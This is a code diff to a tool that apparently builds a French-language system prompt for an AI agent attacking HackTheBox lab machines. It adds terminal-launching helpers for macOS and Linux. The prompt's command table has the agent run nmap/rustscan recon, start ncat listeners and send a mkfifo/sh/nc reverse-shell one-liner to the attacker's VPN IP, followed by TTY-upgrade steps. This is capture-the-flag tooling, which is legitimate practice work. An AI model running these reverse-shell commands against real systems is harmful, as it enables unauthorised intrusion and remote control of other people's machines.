@@ -23,11 +23,26 @@ function hasCommand(cmd: string): boolean {
 }
 
 const HAS_RUSTSCAN = hasCommand('rustscan');
+const IS_MACOS = process.platform === 'darwin';
+
+function getTerminalCmd(cmd: string): string {
+  if (IS_MACOS) {
+    return `osascript -e 'tell app "Terminal" to do script "${cmd.replace(/'/g, "'\\''")}"'`;
+  }
+  // Linux: try common terminal emulators
+  for (const term of ['gnome-terminal -- bash -c', 'xfce4-terminal -e', 'xterm -e']) {
+    const bin = term.split(' ')[0];
+    if (hasCommand(bin)) return `${term} '${cmd}; exec bash'`;
+  }
+  return `x-terminal-emulator -e bash -c '${cmd}; exec bash'`;
+}
 
 export function buildSystemPrompt(box: string, ip: string, boxDir: string): string {
   const notes = readNotes(boxDir);
 
   const domain = box.toLowerCase() + '.htb';
+
+  const openTerminal = getTerminalCmd('ncat -lvnp 9001');
 
   const recon = HAS_RUSTSCAN
     ? `rustscan EST installé — utilise-le : rustscan -a ${ip} --ulimit 5000 -- -Pn -sC -sV -oN ${boxDir}/scans/nmap-detail.txt`
@@ -126,7 +141,7 @@ Pour les ports non-standard (8080, 3000, etc.), ajoute le port : \`http://${doma
 | **shell ssh <user>** | Connexion SSH | ssh <user>@${ip} (avec password ou clé) |
 | **shell reverse <port>** | Écouter un reverse shell via FIFO | rm -f /tmp/shell_in /tmp/shell_out; mkfifo /tmp/shell_in; tail -f /tmp/shell_in | ncat -lvnp <port> -k > /tmp/shell_out 2>&1 & echo "Listener started on port <port> (PID: $!)" |
 | **shell cmd <commande>** | Envoyer une commande au reverse shell | echo "<commande>" > /tmp/shell_in; sleep 1; cat /tmp/shell_out |
-| **shell upgrade** | Ouvrir un shell interactif dans un nouveau terminal | 1) Ouvre un nouveau terminal avec le listener : \`osascript -e 'tell app "Terminal" to do script "ncat -lvnp 9001"'\` 2) Trigger un nouveau reverse shell vers ce port via le FIFO : \`echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc <VPN_IP> 9001 >/tmp/g" > /tmp/shell_in\` 3) Affiche les instructions TTY upgrade à l'utilisateur : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\` |
+| **shell upgrade** | Ouvrir un shell interactif dans un nouveau terminal | 1) Ouvre un nouveau terminal avec le listener : \`${openTerminal}\` 2) Trigger un nouveau reverse shell vers ce port via le FIFO : \`echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc <VPN_IP> 9001 >/tmp/g" > /tmp/shell_in\` 3) Affiche les instructions TTY upgrade à l'utilisateur : \`python3 -c "import pty;pty.spawn('/bin/bash')"\` puis Ctrl+Z, \`stty raw -echo; fg\`, \`export TERM=xterm\` |
 
 ### crack — Cracking
 | Commande | Actions | Outils |
